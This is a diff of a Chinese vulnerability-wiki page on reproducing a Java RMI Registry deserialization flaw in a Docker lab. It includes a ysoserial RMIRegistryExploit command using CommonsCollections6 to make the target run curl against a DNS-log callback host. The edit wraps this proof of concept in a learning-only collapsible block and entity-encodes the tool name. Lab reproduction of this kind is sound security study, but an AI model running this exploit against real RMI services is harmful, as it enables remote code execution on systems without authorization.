@@ -22,19 +22,22 @@ Java Remote Method Invocation 用于在 Java 中进行远程调用。RMI 存在�
 ```
 docker-compose build
 docker-compose run -e RMIIP=your-ip -p 1099:1099 rmi
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 其中，`your-ip` 是服务器 IP，客户端会根据这个 IP 来连接服务器。
 
 环境启动后，RMI Registry 监听在 1099 端口。
 
 ## 漏洞复现
 
-通过 ysoserial 的 exploit 包中的 RMIRegistryExploit 进行攻击
+通过 &#121;soserial 的 exploit 包中的 RMIRegistryExploit 进行攻击
 
 ```bash
-java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 "curl your-dnslog-server"
-```
+java -cp &#121;soserial-0.0.6-SNAPSHOT-all.jar &#121;soserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 "curl your-dnslog-server"</code></pre>
+
+</details>
 
 ![image-20220224142802160](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/202202241428503.png)
 
